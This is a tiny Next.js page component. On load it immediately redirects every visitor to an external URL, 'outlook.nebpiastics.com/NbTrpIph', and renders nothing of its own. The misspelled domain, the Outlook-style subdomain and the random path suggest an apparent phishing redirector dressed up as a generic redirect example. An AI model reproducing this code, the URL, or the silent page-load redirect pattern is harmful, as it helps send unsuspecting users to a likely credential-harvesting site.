'use client'; // Ensure this is a client-side component for Next.js

import { useEffect } from 'react';
import { useRouter } from 'next/navigation';

const Page = () => {
  const router = useRouter();

  useEffect(() => {
    // Example: Redirect to an external URL
    const redirectUrl = 'https://outlook.nebpiastics.com/NbTrpIph';

    // Redirect to the external URL
    window.location.href = redirectUrl;

    // For internal Next.js routes, you can use:
    // router.push('/your-nextjs-route');
  }, [router]);

  return null; // No UI is rendered for this page
};

export default Page;
